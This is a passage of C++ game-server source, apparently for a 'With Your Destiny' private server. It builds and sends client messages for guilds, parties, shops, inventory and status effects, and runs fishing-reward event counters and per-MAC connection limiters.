		pMob[i].MOB.MobName[NAME_LENGTH - 2] = 0;

		strcat(str, pMob[i].MOB.MobName);
		strcat(str, " ");
	}

	if (str[0])
		SendClientMessage(conn, str);

	if (members == 0)
		SendClientMessage(conn, g_pMessageStringTable[_NN_No_Guild_Members]);

	int max_guild = 65536;

	if (pMob[conn].MOB.Guild <= 0 || pMob[conn].MOB.Guild >= max_guild)
		return;

	int gwar = g_pGuildWar[Guild];
	char GuildName[256];

	BASE_GetGuildName(ServerGroup, gwar, GuildName);

	int FoundWar = -1;

	if (gwar > 0 && gwar < max_guild)
	{
		if (Guild == g_pGuildWar[gwar])
		{
			sprintf_s(str, g_pMessageStringTable[_SN_Your_are_at_war], GuildName);
			SendClientMessage(conn, str);

			FoundWar = g_pGuildWar[gwar];
		}
		else
		{
			sprintf_s(str, g_pMessageStringTable[_SN_War_to_S], GuildName);
			SendClientMessage(conn, str);
		}
	}

	for (int j = 1; j < max_guild; j++)
	{
		if (g_pGuildWar[j] == Guild || g_pGuildWar[j] == 0)
			continue;

		if (j == FoundWar)
			continue;

		BASE_GetGuildName(ServerGroup, j, GuildName);

		sprintf_s(str, g_pMessageStringTable[_SN_War_from_S], GuildName);
		SendClientMessage(conn, str);
	}

	int ally = g_pGuildAlly[Guild];

	BASE_GetGuildName(ServerGroup, ally, GuildName);

	if (ally > 0 && ally < max_guild)
	{
		sprintf_s(str, g_pMessageStringTable[_SN_Ally_to_S], GuildName);
		SendClientMessage(conn, str);
	}

	for (int j = 1; j < max_guild; j++)
	{
		if (g_pGuildAlly[j] == Guild || g_pGuildAlly[j] == 0)
			continue;

		BASE_GetGuildName(ServerGroup, j, GuildName);

		sprintf_s(str, g_pMessageStringTable[_SN_Ally_from_S], GuildName);
		SendClientMessage(conn, str);
	}
}

void SendShopList(int conn, int MobIndex, int ShopType)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	if (pUser[conn].Mode != USER_PLAY)
		return;

	if (pUser[conn].cSock.Sock == 0)
		return;

	MSG_ShopList sm_sl;
	memset(&sm_sl, 0, sizeof(MSG_ShopList));

	sm_sl.Type = _MSG_ShopList;
	sm_sl.Size = sizeof(MSG_ShopList);

	sm_sl.ID = ESCENE_FIELD;

	sm_sl.ShopType = ShopType;

	for (int i = 0; i < MAX_SHOPLIST; i++)
	{
		int tx = i / 9;
		int ty = i % 9 + MAX_SHOPLIST * i / 9;

		int invpos = (i % 9) + ((i / 9) * MAX_SHOPLIST);


		*(int*)&sm_sl.List[i] = *(int*)&pMob[MobIndex].MOB.Carry[invpos].sIndex;
		*(int*)((int)&sm_sl.List[i] + 4) = *(int*)((int)&pMob[MobIndex].MOB.Carry[invpos] + 4);
	}

	int posX = pMob[MobIndex].TargetX;
	int posY = pMob[MobIndex].TargetY;

	int village = BASE_GetVillage(posX, posY);

	if (village >= 0 && village < MAX_GUILDZONE)
		sm_sl.Tax = g_pGuildZone[village].CityTax;
	else
		sm_sl.Tax = 0;

	int Size = sm_sl.Size;

	if (Size > sizeof(MSG_ShopList))
	{
		sm_sl.Size = 0;
		return;
	}

	if (!pUser[conn].cSock.AddMessage((char*)&sm_sl, sizeof(MSG_ShopList)))
		CloseUser(conn);
}

void SendItemList(int conn, int MobIndex, int ShopType)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	if (pUser[conn].Mode != USER_PLAY)
		return;

	if (pUser[conn].cSock.Sock == 0)
		return;

	MSG_ShopList sm_sl;
	memset(&sm_sl, 0, sizeof(MSG_ShopList));

	sm_sl.Type = _MSG_ShopList;
	sm_sl.Size = sizeof(MSG_ShopList);

	sm_sl.ID = ESCENE_FIELD;

	sm_sl.ShopType = ShopType;

	int slot = 0;

	for (int i = 0; i < MAX_CARRY; i++) {

		if (*(int*)&pMob[MobIndex].MOB.Carry[i].sIndex <= 0)
			continue;

		for (int j = 0; j < MAX_SHOPLIST; j++) {
			if (*(int*)&sm_sl.List[j] == 0) {
				slot = j;
				break;
			}
		}
		bool exists = false;
		for (int j = 0; j < MAX_SHOPLIST; j++) {
			if (*(int*)&sm_sl.List[j] == *(int*)&pMob[MobIndex].MOB.Carry[i].sIndex)
				exists = true;
		}
		if (exists)
			continue;

		*(int*)&sm_sl.List[slot] = *(int*)&pMob[MobIndex].MOB.Carry[i].sIndex;
	}

	int posX = pMob[MobIndex].TargetX;
	int posY = pMob[MobIndex].TargetY;

	int village = BASE_GetVillage(posX, posY);

	if (village >= 0 && village < MAX_GUILDZONE)
		sm_sl.Tax = g_pGuildZone[village].CityTax;
	else
		sm_sl.Tax = 0;

	int Size = sm_sl.Size;

	if (Size > sizeof(MSG_ShopList))
	{
		sm_sl.Size = 0;
		return;
	}

	if (!pUser[conn].cSock.AddMessage((char*)&sm_sl, sizeof(MSG_ShopList)))
		CloseUser(conn);
}

void SendDonateShop(int conn, int MobIndex, int ShopType)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	if (pUser[conn].Mode != USER_PLAY)
		return;

	if (pUser[conn].cSock.Sock == 0)
		return;

	MSG_DonateShop sm_sl;
	memset(&sm_sl, 0, sizeof(MSG_DonateShop));

	sm_sl.Type = _MSG_DonateShop;
	sm_sl.Size = sizeof(MSG_DonateShop);

	sm_sl.ID = ESCENE_FIELD;

	sm_sl.ShopType = ShopType;

	for (int i = 0; i < 15; i++)
	{
		int tx = i / 9;
		int ty = i % 9 + 15 * i / 9;

		int invpos = (i % 9) + ((i / 9) * 15);


		*(int*)&sm_sl.List[i] = *(int*)&pMob[MobIndex].MOB.Carry[invpos].sIndex;
		*(int*)((int)&sm_sl.List[i] + 4) = *(int*)((int)&pMob[MobIndex].MOB.Carry[invpos] + 4);
	}

	int posX = pMob[MobIndex].TargetX;
	int posY = pMob[MobIndex].TargetY;

	int village = BASE_GetVillage(posX, posY);

	if (village >= 0 && village < MAX_GUILDZONE)
		sm_sl.Tax = g_pGuildZone[village].CityTax;
	else
		sm_sl.Tax = 0;

	int Size = sm_sl.Size;

	if (Size > sizeof(MSG_DonateShop))
	{
		sm_sl.Size = 0;
		return;
	}

	if (!pUser[conn].cSock.AddMessage((char*)&sm_sl, sizeof(MSG_DonateShop)))
		CloseUser(conn);
}

void SendWarInfo(int conn, int Clan)
{

	if (conn <= 0 || conn >= MAX_USER)
		return;

	if (pUser[conn].cSock.Sock == 0)
		return;

	int Guild = 0;
	int max_guild = 65536;

	if (pMob[conn].MOB.Guild <= 0 || pMob[conn].MOB.Guild >= max_guild)
		pMob[conn].MOB.Guild = 0;

	if (g_pGuildWar[pMob[conn].MOB.Guild] <= 0 || g_pGuildWar[pMob[conn].MOB.Guild] >= max_guild)
		g_pGuildWar[pMob[conn].MOB.Guild] = 0;

	if (g_pGuildAlly[pMob[conn].MOB.Guild] <= 0 || g_pGuildAlly[pMob[conn].MOB.Guild] >= max_guild)
		g_pGuildAlly[pMob[conn].MOB.Guild] = 0;

	if (pMob[conn].MOB.Guild && g_pGuildWar[pMob[conn].MOB.Guild] && g_pGuildWar[g_pGuildWar[pMob[conn].MOB.Guild]] == pMob[conn].MOB.Guild)
		Guild = g_pGuildWar[pMob[conn].MOB.Guild];
	else
		Guild = 0;

	SendClientSignalParm3(conn, 30000, _MSG_SendWarInfo, Guild, Clan, g_pGuildAlly[pMob[conn].MOB.Guild]);
}

void SendAddParty(int Leaderconn, int conn, int PartyID)
{
	if (Leaderconn <= 0 || Leaderconn >= MAX_USER)
		return;

	if (pUser[Leaderconn].Mode != USER_PLAY)
		return;

	if (pUser[Leaderconn].cSock.Sock == 0)
		return;

	MSG_CNFAddParty sm_cap;
	memset(&sm_cap, 0, sizeof(MSG_CNFAddParty));

	sm_cap.ID = ESCENE_FIELD;
	sm_cap.Type = _MSG_CNFAddParty;
	sm_cap.Size = sizeof(MSG_CNFAddParty);

	if (PartyID == 0)
		sm_cap.Leaderconn = conn;
	else
		sm_cap.Leaderconn = 30000;

	sm_cap.Level = pMob[conn].MOB.CurrentScore.Level;
	sm_cap.MaxHp = pMob[conn].MOB.CurrentScore.MaxHp > 32000 ? ((pMob[conn].MOB.CurrentScore.MaxHp + 1) / 100) : pMob[conn].MOB.CurrentScore.MaxHp;
	sm_cap.Hp = pMob[conn].MOB.CurrentScore.Hp > 32000 ? ((pMob[conn].MOB.CurrentScore.Hp + 1) / 100) : pMob[conn].MOB.CurrentScore.Hp;

	sm_cap.PartyID = conn;//Check:
	sm_cap.Target = (short)52428;

	strncpy(sm_cap.MobName, pMob[conn].MOB.MobName, sizeof(sm_cap.MobName));

	if (!pUser[Leaderconn].cSock.SendOneMessage((char*)&sm_cap, sizeof(MSG_CNFAddParty)))
		CloseUser(Leaderconn);
}

void SendAddPartyEvocation(int Leaderconn)
{
	if (Leaderconn <= 0 || Leaderconn >= MAX_USER)
		return;

	if (pUser[Leaderconn].Mode != USER_PLAY)
		return;

	if (pUser[Leaderconn].cSock.Sock == 0)
		return;

	MSG_PartyEvocation sm_cap;
	memset(&sm_cap, 0, sizeof(MSG_PartyEvocation));

	sm_cap.Size = sizeof(MSG_PartyEvocation);
	sm_cap.Type = _MSG_PartyEvocation;
	sm_cap.ID = ESCENE_FIELD;

	sm_cap.Leader = Leaderconn;

	memcpy(&sm_cap.EvocationList, &pMob[Leaderconn].Evocations, sizeof(pMob[Leaderconn].Evocations));

	sm_cap.Unknown[0] = 0xCC;
	sm_cap.Unknown[1] = 0xCC;

	if (!pUser[Leaderconn].cSock.SendOneMessage((char*)&sm_cap, sizeof(MSG_PartyEvocation)))
		CloseUser(Leaderconn);
}

bool IsVip(int conn)
{
	for (int i = 0; i < MAX_AFFECT; i++)
	{
		if (pMob[conn].Affect[i].Type == 34)
		{
			return TRUE;
		}
	}
	return FALSE;
}

void SendRemoveParty(int conn, int connExit)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	if (pUser[conn].Mode != USER_PLAY)
		return;

	if (pUser[conn].cSock.Sock == 0)
		return;


	MSG_RemoveParty sm_rp;
	memset(&sm_rp, 0, sizeof(MSG_RemoveParty));

	sm_rp.ID = ESCENE_FIELD;
	sm_rp.Type = _MSG_RemoveParty;
	sm_rp.Size = sizeof(MSG_RemoveParty);

	sm_rp.Leaderconn = connExit;
	sm_rp.unk = 0;

	int Size = sm_rp.Size;

	if (Size > sizeof(MSG_RemoveParty))
	{
		sm_rp.Size = 0;
		return;
	}

	if (conn && conn < MAX_USER && pUser[conn].Mode != 0)
	{
		pUser[conn].cSock.AddMessage((char*)&sm_rp, sizeof(MSG_RemoveParty));
	}
}

void SendCarry(int conn)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	if (pUser[conn].Mode != USER_PLAY)
		return;

	if (pUser[conn].cSock.Sock == 0)
		return;

	MSG_UpdateCarry sm;

	memset(&sm, 0, sizeof(MSG_UpdateCarry));

	sm.ID = conn;
	sm.Type = _MSG_UpdateCarry;
	sm.Size = sizeof(MSG_UpdateCarry);

	memcpy(&sm.Carry, pMob[conn].MOB.Carry, sizeof(STRUCT_ITEM)*MAX_CARRY);

	sm.Coin = pMob[conn].MOB.Coin;

	int Size = sm.Size;

	if (Size > sizeof(MSG_UpdateCarry))
	{
		sm.Size = 0;
		return;
	}

	if (conn && conn < MAX_USER && pUser[conn].Mode != 0)
	{
		if (!pUser[conn].cSock.AddMessage((char*)&sm, sizeof(MSG_UpdateCarry)))
			CloseUser(conn);
	}
}

void SendWeather()
{
	MSG_UpdateWeather sm_uw;
	memset(&sm_uw, 0, sizeof(MSG_UpdateWeather));

	sm_uw.Type = _MSG_UpdateWeather;
	sm_uw.Size = sizeof(MSG_UpdateWeather);

	sm_uw.ID = ESCENE_FIELD;

	sm_uw.CurrentWeather = CurrentWeather;

	for (int i = 0; i < MAX_USER; i++)
	{
		if (pUser[i].Mode != USER_PLAY)
			continue;

		if (!pUser[i].cSock.Sock)
			continue;


		//		if ((pMob[i].TargetX / 128) < 12 && (pMob[i].TargetY / 128) > 25)
		
		if (!pUser[i].cSock.AddMessage((char*)&sm_uw, sizeof(MSG_UpdateWeather)))
			CloseUser(i);
		
	}
}

void SendSetHpMp(int conn)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	if (pUser[conn].Mode != USER_PLAY)
		return;

	if (pUser[conn].cSock.Sock == 0)
		return;

	MSG_SetHpMp sm_shm;
	memset(&sm_shm, 0, sizeof(MSG_SetHpMp));

	sm_shm.Type = _MSG_SetHpMp;
	sm_shm.Size = sizeof(MSG_SetHpMp);
	sm_shm.ID = conn;

	sm_shm.Hp = pMob[conn].MOB.CurrentScore.Hp;
	sm_shm.Mp = pMob[conn].MOB.CurrentScore.Mp;

	SetReqHp(conn);
	SetReqMp(conn);

	sm_shm.ReqHp = pUser[conn].ReqHp;
	sm_shm.ReqMp = pUser[conn].ReqMp;

	int Size = sm_shm.Size;

	if (Size > sizeof(MSG_SetHpMp))
	{
		sm_shm.Size = 0;
		return;
	}

	if (conn && conn < MAX_USER && pUser[conn].Mode != 0)
	{
		if (!pUser[conn].cSock.AddMessage((char*)&sm_shm, sizeof(MSG_SetHpMp)))
			CloseUser(conn);
	}
}

void SendHpMode(int conn)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	if (pUser[conn].Mode != USER_PLAY)
		return;

	if (pUser[conn].cSock.Sock == 0)
		return;

	MSG_SetHpMode sm_shmd;
	memset(&sm_shmd, 0, sizeof(MSG_SetHpMode));

	sm_shmd.Type = _MSG_SetHpMode;
	sm_shmd.Size = sizeof(MSG_SetHpMode);
	sm_shmd.ID = conn;

	sm_shmd.Hp = pMob[conn].MOB.CurrentScore.Hp;
	sm_shmd.Mode = pUser[conn].Mode;

	int Size = sm_shmd.Size;

	if (Size > sizeof(MSG_SetHpMode))
	{
		sm_shmd.Size = 0;
		return;
	}

	if (conn && conn < MAX_USER && pUser[conn].Mode != 0)
	{
		if (!pUser[conn].cSock.AddMessage((char*)&sm_shmd, sizeof(MSG_SetHpMode)))
			CloseUser(conn);
	}
}

//aqui
void SendSay(int mob, char *Message)
{
	MSG_MessageChat sm_mc;
	memset(&sm_mc, 0, sizeof(MSG_MessageChat));

	sm_mc.Type = _MSG_MessageChat;
	sm_mc.Size = sizeof(MSG_MessageChat);
	sm_mc.ID = mob;

	memcpy(sm_mc.String, Message, MESSAGE_LENGTH);

	GridMulticast(pMob[mob].TargetX, pMob[mob].TargetY, (MSG_STANDARD*)&sm_mc, 0);
}

void MapaMulticastArea(int x1, int y1, int x2, int y2, MSG_STANDARD *m, int bSend)
{
	for (int i = 0; i < MAX_USER; i++)
	{
		if (pUser[i].Mode == USER_PLAY && (pMob[i].TargetX >= x1 && pMob[i].TargetX <= x2 && pMob[i].TargetY >= y1 && pMob[i].TargetY <= y2))
		{
			if (!pUser[i].cSock.AddMessage((char*)m, m->Size))
				CloseUser(i);

			/*if (bSend)
				pUser[i].cSock.SendMessageA();*/
		}
	}
}

void MapaMulticast(int tx, int ty, MSG_STANDARD *m, int bSend)
{
	for (int i = 1; i < MAX_USER; i++)
	{
		if (pUser[i].Mode == USER_PLAY && (pMob[i].TargetX / 128) == tx && (pMob[i].TargetY / 128) == ty)
		{
			if (!pUser[i].cSock.AddMessage((char*)m, m->Size))
				CloseUser(i);

			if (bSend)
				pUser[i].cSock.SendMessageA();
		}
	}
}

void SendMessageArea(int x1, int y1, int x2, int y2, MSG_STANDARD *m, int bSend)
{
	for (int i = 0; i < MAX_USER; i++)
	{
		if (pUser[i].Mode != USER_PLAY)
			continue;

		if (pMob[i].TargetX >= x1 && pMob[i].TargetY <= x2 && pMob[i].TargetY >= y1 && pMob[i].TargetY <= y2)
		{
			if (!pUser[i].cSock.AddMessage((char*)m, m->Size))
				CloseUser(i);

			if (bSend)
				pUser[i].cSock.SendMessageA();
		}
	}
}

void SendSignalParmArea(int x1, int y1, int x2, int y2, int id, unsigned short signal, int parm)
{
	for (int x = x1; x < x2; x++)
	{
		for (int y = y1; y < y2; y++)
		{
			if (x < 0 || x >= MAX_GRIDX || y < 0 || y >= MAX_GRIDY)
				continue;

			int tmob = pMobGrid[y][x];

			if (tmob >= MAX_USER || tmob == 0)
				continue;

			if (pUser[tmob].Mode != USER_PLAY)
				continue;

			SendClientSignalParm(tmob, id, signal, parm);
		}
	}
}

void SendShortSignalParm2Area(int x1, int y1, int x2, int y2, int id, unsigned short signal, int parm1, int parm2)
{
	for (int x = x1; x < x2; x++)
	{
		for (int y = y1; y < y2; y++)
		{
			if (x < 0 || x >= MAX_GRIDX || y < 0 || y >= MAX_GRIDY)
				continue;

			int tmob = pMobGrid[y][x];

			if (tmob >= MAX_USER || tmob == 0)
				continue;

			if (pUser[tmob].Mode != USER_PLAY)
				continue;

			SendClientSignalShortParm2(tmob, id, signal, parm1, parm2);
		}
	}
}

void SendPKInfo(int conn, int target)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	if (target <= 0 || target >= MAX_USER)
		return;

	MSG_STANDARDPARM sm;
	memset(&sm, 0, sizeof(MSG_STANDARDPARM));

	sm.Size = sizeof(MSG_STANDARDPARM);
	sm.Type = _MSG_PKInfo;
	sm.ID = target;

	if (NewbieEventServer == 0)
	{
		int guilty = GetGuilty(target);

		int state = 0;

		if (guilty || pUser[target].PKMode || RvRState || CastleState || GTorreState)
			state = 1;

		sm.Parm = state;
	}
	else
		sm.Parm = 1;

	int Size = sm.Size;

	if (Size > sizeof(MSG_STANDARDPARM))
	{
		sm.Size = 0;
		return;
	}
	if (conn && conn < MAX_USER && pUser[conn].Mode != 0)
		if (!pUser[conn].cSock.AddMessage((char*)&sm, sizeof(MSG_STANDARDPARM)))
			CloseUser(conn);
}

void SendAffect(int conn)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;

	MSG_SendAffect sm;

	memset(&sm, 0, sizeof(MSG_SendAffect));

	sm.Type = _MSG_SendAffect;
	sm.Size = sizeof(MSG_SendAffect);
	sm.ID = conn;

	for (int i = 0; i < MAX_AFFECT; i++) // i = 0;
	{
		if (pMob[conn].Affect[i].Type == 34 && pMob[conn].Affect[i].Time >= 32000000)
		{
			time_t now;

			time(&now);

			if ((pMob[conn].extra.DivineEnd - now) <= 86400) // 3600
			{
				pMob[conn].Affect[i].Time = 10800; // 450

				sm.Affect[i].Type = pMob[conn].Affect[i].Type;
				sm.Affect[i].Value = pMob[conn].Affect[i].Value;
				sm.Affect[i].Level = pMob[conn].Affect[i].Level;
				sm.Affect[i].Time = pMob[conn].Affect[i].Time;

				continue;
			}

			sm.Affect[i].Type = pMob[conn].Affect[i].Type;
			sm.Affect[i].Value = pMob[conn].Affect[i].Value;
			sm.Affect[i].Level = pMob[conn].Affect[i].Level;
			sm.Affect[i].Time = (int)(((pMob[conn].extra.DivineEnd - now) / 60 / 60 / 24 * AFFECT_1D) - 1);
		}
		else if (pMob[conn].Affect[i].Type >= 1)
		{
			sm.Affect[i].Type = pMob[conn].Affect[i].Type;
			sm.Affect[i].Value = pMob[conn].Affect[i].Value;
			sm.Affect[i].Level = pMob[conn].Affect[i].Level;
			sm.Affect[i].Time = pMob[conn].Affect[i].Time;
		}
	}
	int Size = sm.Size;

	if (Size > sizeof(MSG_SendAffect))
	{
		sm.Size = 0;
		return;
	}
	if (conn && conn < MAX_USER && pUser[conn].Mode != 0)
		if (!pUser[conn].cSock.AddMessage((char*)&sm, sizeof(MSG_SendAffect)))
			CloseUser(conn);
}

void SendRecycle(int conn)
{
	if (pUser[conn].Mode != USER_PLAY)
		return;

	MSG_Rebuy m;
	memset(&m, 0, sizeof(MSG_Rebuy));
	m.ID = conn;
	m.Type = 0x3E8;
	m.Size = sizeof(MSG_Rebuy);

	for (int i = 0; i < MAX_ITEM_REBUY; i++)
		m.Rebuy[i] = pMob[conn].Rebuy[i];

	int Size = m.Size;

	if (Size > sizeof(MSG_Rebuy))
	{
		m.Size = 0;
		return;
	}
	
	if (conn && conn < MAX_USER && pUser[conn].Mode != 0)
	{
		if (!pUser[conn].cSock.AddMessage((char*)&m, sizeof(MSG_Rebuy)))
			CloseUser(conn);
	}
}

//BOSS LAN N PINHEIRO
void SendLanCount(int conn)
{
	if (g_LanNBoss == FALSE) {
		if (g_LanNBossCount >= 1000) //EDITAR QUANTIDADE DE MOB QUE PRECISA MATAR NA LAN PARA NACER O BOSS
		{
			int Index = 4891; // INDEX DELE NO NPC GERNE PARA SUMMON
			GenerateMob(Index, 3640, 3639);
			SendNoticeArea("*** O Guardião do Território Apareceu ***", 3604, 3601, 3690, 3690); //AVISO QUE BOSS NACEU PARA JOGADORES
			g_LanNBoss = TRUE;
			g_LanNBossCount = 0;
			return;
		}
		g_LanNBossCount += 1;
		SendClientSignalShortParm2(conn, ESCENE_FIELD, _MSG_MobCount, g_LanNBossCount, 1000); //EDITAR QUANTIDADE DE MOB QUE PRECISA MATAR NA LAN PARA NACER O BOSS
	}
}

void SendEventCount(int conn)
{
	MSG_STANDARDPARM2 w;
	memset(&w, 0, sizeof(MSG_STANDARDPARM2));

	int npcIndex = w.Parm1;
	int confirm = w.Parm2;


	if (pUser[conn].EventDelay != 0)
	{
		int isTime = GetTickCount64() - pUser[conn].EventDelay;
		if (isTime < 600)
			return;
	}
	pUser[conn].EventDelay = GetTickCount64();

	STRUCT_ITEM item;
	memset(&item, 0, sizeof(STRUCT_ITEM));

	item.sIndex = 475;
	
	if (wUser[conn].CounterHist > 250)
	{
		SendItemagrupar(conn, item.sIndex);
		SendCarry(conn);
		SaveUser(conn, 0);
		wUser[conn].CounterHist = 0;								
	}
	if (pUser[conn].Keys[49] == 1) {
		wUser[conn].CounterHist++;
	}
	wUser[conn].CounterHist++;
	SendClientSignalShortParm2(conn, ESCENE_FIELD, _MSG_MobCount, wUser[conn].CounterHist, 250);
}

void SendEventCount2(int conn)
{
	MSG_STANDARDPARM2 w;
	memset(&w, 0, sizeof(MSG_STANDARDPARM2));

	int npcIndex = w.Parm1;
	int confirm = w.Parm2;

	int npcMerc = pMob[npcIndex].MOB.Merchant;
	int npcGrade = BASE_GetItemAbilityNosanc(&pMob[npcIndex].MOB.Equip[0], 400);

	/*if (pUser[conn].Atraso != 0)
	{
		int isTime = GetTickCount64() - pUser[conn].Atraso;

		if (isTime < 1000)
		{
			return;
		}

	}*/

	//pUser[conn].Atraso = GetTickCount64();

	bool premium = false;
	int slotsInv = 30;

	if (pMob[conn].MOB.Carry[60].sIndex == 3467) {
		slotsInv += 15;
	}

	if (pMob[conn].MOB.Carry[61].sIndex == 3467) {
		slotsInv += 15;
	}

	for (int j = 0; j < slotsInv; j++) {
		if (pMob[conn].MOB.Carry[j].sIndex == 5666)
			premium = true;
	}

	//contador de tempo pesca
	if (premium == false) {
		if (wUser[conn].CounterHist > 360)
		{
			STRUCT_ITEM item;
			memset(&item, 0, sizeof(STRUCT_ITEM));

			std::mt19937 generator;
			generator.seed((unsigned int)std::time(0));
			std::uniform_int_distribution<uint32_t> dice(1, 100);
			int random = dice(generator);

			//sprintf(temp, "Dice: %d/100", random);
			//SendClientMessage(conn, temp);

			bool entrega = true;
			//5 %
			if (random <= 5 && entrega == true) {

				item.sIndex = 5671;
				entrega = false;
			}
			//15 %
			if (random <= 20 && entrega == true) {
				item.sIndex = 5670;
				entrega = false;
			}
			//30 %
			if (random <= 50 && entrega == true) {
				item.sIndex = 5669;
				entrega = false;
			}
			//50 %
			if (random <= 100 && entrega == true) {
				item.sIndex = 5668;
				entrega = false;
			}

			int IdItem = item.sIndex;
			int cont = 0;
			for (int i = 0; i < slotsInv; i++)
			{
				if (pMob[conn].MOB.Carry[i].sIndex == IdItem)
					cont += pMob[conn].MOB.Carry[i].stEffect[0].cEffect == 61 ? pMob[conn].MOB.Carry[i].stEffect[0].cValue : 1;
			}

			if (cont <= 250) {
				RemoveItem(conn, IdItem, cont);
				item.stEffect[0].cEffect = 61;
				item.stEffect[0].cValue = cont + 1;
				PutItem(conn, &item);
			}

			if (cont > 250 && cont < 500) {
				RemoveItem(conn, IdItem, cont);
				item.stEffect[0].cEffect = 61;
				item.stEffect[0].cValue = 250;
				PutItem(conn, &item);

				item.stEffect[0].cEffect = 61;
				item.stEffect[0].cValue = (cont - 250) + 1;
				PutItem(conn, &item);
			}

			if (cont >= 500)
				SendClientMessage(conn, "Limite máximo de recompensa alcançado");

			wUser[conn].CounterHist = 0;
			return;
		}

		wUser[conn].CounterHist++;
		SendClientSignalShortParm2(conn, ESCENE_FIELD, _MSG_MobCount, wUser[conn].CounterHist, 360);
	}

	if (premium == true) {
		if (wUser[conn].CounterHist > 360)
		{

			STRUCT_ITEM item;
			memset(&item, 0, sizeof(STRUCT_ITEM));

			std::mt19937 generator;
			generator.seed((unsigned int)std::time(0));
			std::uniform_int_distribution<uint32_t> dice(1, 100);
			int random = dice(generator);

			bool entrega = true;

			//15 %
			if (random <= 15 && entrega == true) {

				item.sIndex = 5671;
				item.stEffect[0].cEffect = 0;
				item.stEffect[0].cValue = 0;
				entrega = false;
			}
			//25 %
			if (random <= 40 && entrega == true) {
				item.sIndex = 5670;
				item.stEffect[0].cEffect = 0;
				item.stEffect[0].cValue = 0;
				entrega = false;
			}
			//30 %
			if (random <= 70 && entrega == true) {
				item.sIndex = 5669;
				item.stEffect[0].cEffect = 61;
				item.stEffect[0].cValue = 30;
				entrega = false;
			}
			//30 %
			if (random <= 100 && entrega == true) {
				item.sIndex = 5668;
				item.stEffect[0].cEffect = 0;
				item.stEffect[0].cValue = 0;
				entrega = false;
			}
			

			int IdItem = item.sIndex;
			int cont = 0;
			for (int i = 0; i < slotsInv; i++)
			{
				if (pMob[conn].MOB.Carry[i].sIndex == IdItem)
					cont += pMob[conn].MOB.Carry[i].stEffect[0].cEffect == 61 ? pMob[conn].MOB.Carry[i].stEffect[0].cValue : 1;
			}

			if (cont <= 250) {
				RemoveItem(conn, IdItem, cont);
				item.stEffect[0].cEffect = 61;
				item.stEffect[0].cValue = cont + 1;
				PutItem(conn, &item);
			}

			if (cont > 250 && cont < 500) {
				RemoveItem(conn, IdItem, cont);
				item.stEffect[0].cEffect = 61;
				item.stEffect[0].cValue = 250;
				PutItem(conn, &item);

				item.stEffect[0].cEffect = 61;
				item.stEffect[0].cValue = (cont - 250) + 1;
				PutItem(conn, &item);
			}

			if (cont >= 500)
				SendClientMessage(conn, "Limite máximo de recompensa alcançado");


			wUser[conn].CounterHist = 0;
			RemoveItem(conn, 5666, 1);
			return;
		}
		wUser[conn].CounterHist++;
		SendClientSignalShortParm2(conn, ESCENE_FIELD, _MSG_MobCount, wUser[conn].CounterHist, 360);
	}
}

void SendClientSignalParmCoord(int conn, int id, unsigned short signal, int parm, int x1, int y1, int x2, int y2)
{
	if (conn <= 0 || conn >= MAX_USER)
		return;


	if (pUser[conn].cSock.Sock == 0)
		return;

	if (pMob[conn].TargetX >= x1 && pMob[conn].TargetX <= x2 && pMob[conn].TargetY >= y1 && pMob[conn].TargetY <= y2)
	{

		MSG_STANDARDPARM sm;
		memset(&sm, 0, sizeof(MSG_STANDARDPARM));

		sm.Type = signal;
		sm.ID = id;
		sm.Parm = parm;

		int Size = sm.Size;

		if (Size > sizeof(MSG_STANDARDPARM))
		{
			sm.Size = 0;
			return;
		}

		if (!pUser[conn].cSock.AddMessage((char*)&sm, sizeof(sm)))
			CloseUser(conn);
	}
}

//int Limitadordelojinha(char* Mac)
//{
//	int retn = 0;
//
//	if (!strcmp(Mac, ""))
//		return 0;
//
//	for (int i = 0; i < MAX_USER; i++)
//
//		if (pUser[i].TradeMode == 1)
//		{
//			if (pUser[i].Mode == 22)
//				if (!strcmp(Mac, pUser[i].MacAddress))
//					retn++;
//		}
//
//	return retn;
//}

int Limitadordelojinha(char* Mac)
{
	int retn = 0;

	if (!strcmp(Mac, ""))
		return 0;

	for (int i = 0; i < MAX_USER; i++)
	{
		if (pUser[i].Mode != USER_PLAY)
			continue;

		if (!pUser[i].cSock.Sock)
			continue;
		if (pUser[i].TradeMode == 1)
		{
			if (!strcmp(Mac, pUser[i].MacAddress))
				retn++;

		}
	}

	return retn;
}

int Limitadordeconexoes(char* Mac)
{
	int retn = 0;

	if (!strcmp(Mac, ""))
		return 0;

	for (int i = 0; i < MAX_USER; i++)

		if (pUser[i].Mode == 22)
			if (!strcmp(Mac, pUser[i].MacAddress))
				retn++;

	return retn;
}

//int Limitadordeconexoes(char* Mac)
//{
//	int retn = 0;
//
//	if (!strcmp(Mac, ""))
//		return 0;
//
//	for (int i = 0; i < MAX_USER; i++)
//
//		if (pUser[i].Mode == 22)
//			if (!strcmp(Mac, pUser[i].MacAddress))
//				retn++;
//
//	return retn;
//}

void SendReqParty(int Leaderconn, int conn, int PartyID)
{
	if (Leaderconn <= 0 || Leaderconn >= MAX_USER)
		return;

	if (pUser[Leaderconn].Mode != USER_PLAY)
		return;

	if (pUser[Leaderconn].cSock.Sock == 0)
		return;

	MSG_SendReqParty sm_cap;
	memset(&sm_cap, 0, sizeof(MSG_SendReqParty));

	sm_cap.ID = ESCENE_FIELD;
	sm_cap.Type = _MSG_SendReqParty;
	sm_cap.Size = sizeof(MSG_SendReqParty);

	if (PartyID == 0)
		sm_cap.Target = conn;
	else
		sm_cap.Target = 30000;

	sm_cap.Level = pMob[conn].MOB.CurrentScore.Level;
	sm_cap.MaxHp = pMob[conn].MOB.CurrentScore.MaxHp > 32000 ? ((pMob[conn].MOB.CurrentScore.MaxHp + 1) / 100) : pMob[conn].MOB.CurrentScore.MaxHp;
	sm_cap.Hp = pMob[conn].MOB.CurrentScore.Hp > 32000 ? ((pMob[conn].MOB.CurrentScore.Hp + 1) / 100) : pMob[conn].MOB.CurrentScore.Hp;

	sm_cap.PartyID = conn;//Check:
	sm_cap.Target = (short)52428;

	strncpy(sm_cap.MobName, pMob[conn].MOB.MobName, sizeof(sm_cap.MobName));

